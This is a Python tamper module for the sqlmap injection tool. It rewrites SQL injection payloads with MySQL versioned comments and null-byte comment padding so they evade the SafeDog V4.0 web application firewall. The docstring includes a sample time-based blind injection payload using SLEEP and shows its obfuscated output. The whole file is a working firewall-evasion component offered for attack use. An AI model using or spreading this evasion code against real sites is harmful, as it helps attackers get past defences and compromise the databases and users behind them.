#!/usr/bin/env python

"""
version: 1.0
Author: Kyrie403
copyright (c) Kyrie403
link: https://github.com/kyrie403

"""

import re
import string
from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.HIGH

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Requirement:
        * MySQL > 5.0

    Notes:
        * Useful to bypass SafeDog V4.0

    >>> tamper("AND 2610=IF((11=11),(SLEEP(5)),2610) AND 'eCSJ'='eCSJ")
    "/*!50010AND*//*%00*/2610=/*!50010IF*/((11=11),(/*!SLEEP/**/*//**/(5)),2610)/*%00*//*!50010AND*//*%00*/'eCSJ'='eCSJ"
    """
    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!50010%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        keyword = ['SLEEP', 'database', 'user']
        for key in keyword:
            if key in retVal:
                pattern_func = r'{}\(\w*\)'.format(key)
                pattern_value = r'(?<={}\()\w*(?=\))'.format(key)
                value = re.findall(pattern_value, retVal)
                func = re.findall(pattern_func, retVal)
                retVal = retVal.replace(func[0], "(/*!{key}/**/*//**/({value}))").format(key=key, value=value[0])
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" ", "/*%00*/").replace("%20", "/*%00*/")

    return retVal
